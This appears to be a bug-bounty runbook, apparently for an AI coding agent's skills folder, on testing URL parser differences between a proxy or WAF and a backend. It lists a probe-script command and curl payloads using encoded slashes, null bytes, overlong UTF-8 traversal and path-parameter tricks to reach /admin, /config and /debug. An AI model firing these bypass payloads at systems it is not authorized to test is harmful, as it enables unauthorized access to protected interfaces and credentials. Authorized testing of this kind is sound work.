# URL Parser Differential Runbook

## Purpose
Detect URL parsing differences between frontend proxy/WAF and backend application. Attackers send crafted URLs that one parser interprets differently (bypassing ACL checks, accessing protected resources, or enabling path traversal).

## Prerequisites
- Target has protected paths (/admin, /config, /api/internal, etc.)
- Python 3.9+ with `requests` library
- Baseline understanding of what 200/403/404 responses look like for the target

## Variables
| Variable | Description |
|----------|-------------|
| `TARGET` | Target base URL |
| `OUTDIR` | Output directory |
| `PROTECTED_PATHS` | Comma-separated list of restricted paths (default: /admin,/api/internal,/config,/debug) |

## Commands

### 1. Full Differential Probe
```bash
python3 .claude/skills/http-protocol/scripts/url_parser_differential.py \
  --context .bb/context.json \
  --target https://TARGET \
  --protected-paths /admin,/api/internal,/config,/debug,/private \
  --output $OUTDIR/http-protocol/url-parser/differential_findings.jsonl
```

### 2. Focused on Specific Protected Path
```bash
python3 .claude/skills/http-protocol/scripts/url_parser_differential.py \
  --context .bb/context.json \
  --target https://TARGET \
  --protected-paths /admin \
  --output $OUTDIR/http-protocol/url-parser/differential_findings.jsonl
```

### 3. Quick Manual Tests — Encoding Ladder
```bash
# Single URL encode (%2F = /)
curl -s "https://TARGET/admin%2Fconfig" -o /dev/null -w "Single enc: %{http_code}\n"
# Double URL encode (%252F = %2F decoded to /)
curl -s "https://TARGET/admin%252Fconfig" -o /dev/null -w "Double enc: %{http_code}\n"
# Backslash path
curl -s "https://TARGET/\admin\config" -o /dev/null -w "Backslash: %{http_code}\n"
# Null byte
curl -s "https://TARGET/admin%00.html" -o /dev/null -w "Null byte: %{http_code}\n"
# Dot-segment normalization
curl -s "https://TARGET/admin/./config" -o /dev/null -w "Dot-seg: %{http_code}\n"
```

### 4. Unicode Overlong UTF-8 Tests
```bash
curl -s "https://TARGET/%c0%ae%c0%ae/admin" -o /dev/null -w "Overlong dotdot: %{http_code}\n"
curl -s "https://TARGET/%e0%80%ae%c0%ae/admin" -o /dev/null -w "3-byte overlong: %{http_code}\n"
curl -s "https://TARGET/..%c0%afadmin" -o /dev/null -w "Overlong slash: %{http_code}\n"
```

### 5. Path Parameter Confusion
```bash
curl -s "https://TARGET/admin;.js/config" -o /dev/null -w "Path param js: %{http_code}\n"
curl -s "https://TARGET/admin ;js/config" -o /dev/null -w "Space semicolon: %{http_code}\n"
curl -s "https://TARGET/..;/admin" -o /dev/null -w "Path param dott: %{http_code}\n"
```

## Expected Output

### Successful bypass:
```json
{
  "test_name": "encoded_slash_single",
  "test_path": "admin%2Fconfig",
  "bypass_detected": true,
  "bypass_reason": "Got 200 where baseline returned 403",
  "evidence_snippet": "<html>Admin Config Panel...",
  "status_code": 200,
  "baseline_status": 403
}
```

## Triage Guide

| Result | Action |
|--------|--------|
| `bypass_detected: true` with response similar to baseline | ACL bypass confirmed — parser differential exploited |
| Status 200 for path that should be 403/401 | Bypass confirmed (frontend didn't match, backend served) |
| Status 301/302 for test paths | Possible redirect-based normalization — check Location header |
| All tests return same status as baseline | No differential — parsers agree |
| 400 for all encoded variants | Server rejects encoded paths — try different encoding schemes |

## Severity: High (CVSS 7.8+) — Paths may include:
- Administrative interfaces accessible without authentication
- API endpoint with sensitive data
- Configuration files exposing credentials
- Debug endpoints revealing stack traces

If combined with SSRF or file read primitives, escalate to Critical.
